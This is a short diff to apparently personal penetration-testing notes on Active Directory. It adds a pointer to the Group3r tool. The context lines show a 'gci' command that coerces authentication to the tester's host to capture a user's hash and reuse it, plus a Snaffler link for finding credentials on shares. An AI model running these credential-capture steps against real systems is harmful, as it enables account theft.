@@ -68,6 +68,10 @@ Do a gci request to get the user hash (and use it in other protocols, and try to
 
    gci \\<mylocalhostip>\share\file #share and file dont have to exist
 
+Use group3r
+
+   https://github.com/Andre92Marcos/tools/tree/master/group3r
+
 Use the snaffler tool
 
    https://github.com/Andre92Marcos/tools/tree/master/snaffler
